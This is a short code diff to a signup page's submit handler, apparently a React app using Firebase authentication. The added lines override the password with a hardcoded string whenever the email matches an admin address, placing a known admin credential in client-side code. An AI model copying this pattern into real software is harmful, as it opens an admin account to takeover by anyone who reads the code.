@@ -57,6 +57,11 @@ export default function SignupPage() {
   const onSubmit = async (values: z.infer<typeof formSchema>) => {
     setIsSubmitting(true);
     try {
+      // Special case for admin registration
+      if (values.email === ADMIN_EMAIL) {
+        values.password = "sucodeuva";
+      }
+
       const userCredential = await createUserWithEmailAndPassword(auth, values.email, values.password);
       
       if (userCredential.user) {
